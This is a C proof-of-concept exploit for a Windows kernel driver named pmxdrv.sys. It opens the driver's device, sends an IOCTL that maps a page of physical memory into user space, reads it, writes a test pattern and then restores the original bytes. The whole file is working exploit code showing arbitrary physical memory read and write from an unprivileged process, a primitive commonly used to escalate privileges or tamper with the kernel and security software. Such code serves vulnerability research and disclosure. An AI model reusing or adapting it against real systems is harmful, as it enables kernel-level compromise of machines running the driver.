/*
pmxdrv.sys PoC #1 - Physical Memory Read/Write

Demonstrates the physical-memory read and write primitives exposed by IOCTL 0x00222AB8.

The PoC:
   1. Opens device handle \\.\PMXDRV
   2. Builds input structure
   3. Requests a one-page mapping of physical address 0x100000
   4. Retrieves the returned MappedAddress
   5. Reads and saves the original contents
   6. Writes a test pattern to MappedAddress
   7. Reads back and verifies the bytes written
   8. Restores original contents to MappedAddress
*/

#include <windows.h>
#include <stdio.h>
#include <stdint.h>

// Configuration
#define DEVICE_NAME             "\\\\.\\PMXDRV"
#define IOCTL_MAP_PHYSICAL      0x00222AB8
#define TARGET_PHYSICAL_ADDRESS 0x100000ULL
#define PAGE_COUNT              1
#define READ_SIZE               16

// Structures required
#pragma pack(push, 1)

typedef struct {
    DWORD  Size;             // +0x00, must be 24
    UINT64 PhysicalAddress;  // +0x04
    DWORD  PageCount;        // +0x0C
    UINT64 MappedAddress;    // +0x10, output
} REQUEST;

typedef struct {
    UINT64 Request;          // +0x00, points to REQUEST structure
    DWORD  Flag;             // +0x08, must be <=63
    DWORD  Unknown;          // +0x0C
} INPUT_BUFFER;

#pragma pack(pop)

// Get handle to pmxdrv.sys
HANDLE getHandle(void)
{
    printf("[*] Opening %s...\n", DEVICE_NAME);

    HANDLE handle = CreateFileA(
        DEVICE_NAME,
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        0,
        NULL
    );

    if (handle == INVALID_HANDLE_VALUE) {
        printf("[-] Failed to open %s (error %lu)\n", DEVICE_NAME, GetLastError());
        exit(1);
    }

    printf("[+] Device opened successfully\n");
    return handle;
}

// Read from mapped address
BOOL ReadMappedAddress(UINT64 mappedAddress, BYTE* buffer, SIZE_T size)
{
    BYTE* mapped = (BYTE*)(uintptr_t)mappedAddress;

    __try {
        for (SIZE_T i = 0; i < size; i++) {
            buffer[i] = mapped[i];
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception while reading mapped memory (0x%08lX)\n", GetExceptionCode());
        return FALSE;
    }

    return TRUE;
}

// Write to mapped address
BOOL WriteMappedAddress(UINT64 mappedAddress, const BYTE* buffer, SIZE_T size)
{
    BYTE* mapped = (BYTE*)(uintptr_t)mappedAddress;

    __try {
        for (SIZE_T i = 0; i < size; i++) {
            mapped[i] = buffer[i];
        }
    }
    __except (EXCEPTION_EXECUTE_HANDLER) {
        printf("[-] Exception while writing mapped memory (0x%08lX)\n", GetExceptionCode());
        return FALSE;
    }

    return TRUE;
}

// Print bytes read from mapped address in Hex and ASCII
void PrintBytes(const BYTE* buffer, SIZE_T size, ULONGLONG physicalAddress)
{
    printf("\n    Physical Address     Hex Bytes                                         ASCII");
    printf("\n    ------------------   ------------------------------------------------  ----------------\n");

    for (SIZE_T offset = 0; offset < size; offset += 16) {
        SIZE_T remaining = size - offset;
        SIZE_T count = (remaining < 16) ? remaining : 16;

        // Physical address
        printf("    0x%016llX   ", physicalAddress + offset);

        // Hex bytes
        for (SIZE_T i = 0; i < 16; i++) {
            if (i < count)
                printf("%02X ", buffer[offset + i]);
            else
                printf("   ");

            // Extra spacing between groups of 8 bytes
            if (i == 7)
                printf(" ");
        }

        // ASCII
        printf(" ");

        for (SIZE_T i = 0; i < count; i++) {
            BYTE c = buffer[offset + i];
            printf("%c", (c >= 0x20 && c <= 0x7E) ? c : '.');
        }

        printf("\n\n");
    }
}

// Print test pattern to be written
void PrintTestPattern(const BYTE* buffer, SIZE_T size)
{
    printf("    Hex:   ");

    for (SIZE_T i = 0; i < size; i++) {
        printf("%02X ", buffer[i]);
    }

    printf("\n    ASCII: ");

    for (SIZE_T i = 0; i < size; i++) {
        BYTE c = buffer[i];
        printf("%c", (c >= 0x20 && c <= 0x7E) ? c : '.');
    }

    printf("\n");
}

int main(void)
{
    printf("============================================================\n");
    printf("pmxdrv.sys PoC #1 - Physical Memory Read/Write\n");
    printf("============================================================\n\n");

    // Get handle to pmxdrv.sys
    HANDLE pmxdrvHandle = getHandle();

    // Allocate memory for request structure
    REQUEST* request = (REQUEST*)VirtualAlloc(
        NULL,
        sizeof(*request),
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );

    // Handle memory allocation failure
    if (!request) {
        printf("[-] VirtualAlloc failed (error %lu)\n", GetLastError());
        CloseHandle(pmxdrvHandle);
        return 1;
    }

    // Initialise request
    request->Size = sizeof(*request);
    request->PhysicalAddress = TARGET_PHYSICAL_ADDRESS;
    request->PageCount = PAGE_COUNT;
    request->MappedAddress = 0;

    // Initialise input
    INPUT_BUFFER input;
    input.Request = (UINT64)(uintptr_t)request;
    input.Flag = 0;
    input.Unknown = 0;

    // Print request parameters
    printf("\n[*] Sending IOCTL request...\n", IOCTL_MAP_PHYSICAL);
    printf("[*] IOCTL:            0x%08lX\n", IOCTL_MAP_PHYSICAL);
    printf("[*] Physical Address: 0x%llX\n", (unsigned long long)request->PhysicalAddress);
    printf("[*] Pages:            %lu\n", request->PageCount);

    // Trigger phymem mapping 
    BOOL success = DeviceIoControl(
        pmxdrvHandle,
        IOCTL_MAP_PHYSICAL,
        &input,
        sizeof(input),
        NULL,
        0,
        NULL,
        NULL
    );

    // Handle mapping failure
    if (!success) {
        printf("[-] DeviceIoControl failed (error %lu)\n", GetLastError());
        VirtualFree(request, 0, MEM_RELEASE);
        CloseHandle(pmxdrvHandle);
        return 1;
    }

    // Retrieve mapped address
    UINT64 mappedAddress = request->MappedAddress;

    // Handle empty mapping
    if (mappedAddress == 0) {
        printf("[-] IOCTL succeeded but returned no mapping\n");
        VirtualFree(request, 0, MEM_RELEASE);
        CloseHandle(pmxdrvHandle);
        return 1;
    }

    // Print mapped address
    printf("[+] IOCTL completed successfully\n");
    printf("[+] Mapped address: 0x%llX\n\n", (unsigned long long)mappedAddress);

    BYTE original[READ_SIZE] = { 0 };
    BYTE testPattern[READ_SIZE] = {
        0xAA, 0xBB, 0xCC, 0xDD,
        0x11, 0x22, 0x33, 0x44,
        0x55, 0x66, 0x77, 0x88,
        0x99, 0xAA, 0xBB, 0xCC
    };
    BYTE verify[READ_SIZE] = { 0 };
    BYTE restored[READ_SIZE] = { 0 };

    // Read original bytes from mapped address and handle read failure
    if (!ReadMappedAddress(mappedAddress, original, sizeof(original))) {
        printf("[-] Failed to read original contents\n");
        goto cleanup;
    }

    // Print original bytes read from mapped address
    printf("[*] Reading mapped memory:\n");
    PrintBytes(original, sizeof(original), request->PhysicalAddress);
    printf("[+] Read successful\n");

    // Write test pattern to mapped address and handle write failure
    printf("\n[*] Writing test pattern...\n");
    PrintTestPattern(testPattern, sizeof(testPattern));
    if (!WriteMappedAddress(mappedAddress, testPattern, sizeof(testPattern))) {
        printf("[-] Failed to write test pattern\n");
        goto cleanup;
    }

    // Read written bytes from mapped address and handle read failure
    if (!ReadMappedAddress(mappedAddress, verify, sizeof(verify))) {
        printf("[-] Failed to read back test pattern\n");
        goto cleanup;
    }

    // Print bytes written to mapped address
    printf("[*] Read-back written contents:\n");
    PrintBytes(verify, sizeof(verify), request->PhysicalAddress);

    // Compare verify against testPattern
    if (memcmp(verify, testPattern, sizeof(testPattern)) != 0) {
        printf("[-] Write verification failed\n");
        goto cleanup;
    }
    printf("[+] Write verified\n");
    printf("[+] Write successful\n");

    // Restore original contents to mapped address
    printf("\n[*] Restoring original contents...\n");
    if (!WriteMappedAddress(mappedAddress, original, sizeof(original))) {
        printf("[-] Failed to restore original contents\n");
        goto cleanup;
    }

    // Read restored contents and handle read failure
    if (!ReadMappedAddress(mappedAddress, restored, sizeof(restored))) {
        printf("[-] Failed to read back restored contents\n");
        goto cleanup;
    }

    // Print restored content
    printf("[*] Read-back restored contents:\n");
    PrintBytes(restored, sizeof(restored), request->PhysicalAddress);

    // Compare verify against testPattern
    if (memcmp(restored, original, sizeof(original)) != 0) {
        printf("[-] Restore verification failed\n");
        goto cleanup;
    }
    printf("[+] Restore verified\n");
    printf("[+] Restore successful\n");

    printf("\n[+] Physical memory read and write primitives demonstrated\n");

    // Cleanup
cleanup:
    VirtualFree(request, 0, MEM_RELEASE);
    CloseHandle(pmxdrvHandle);
    return 0;
}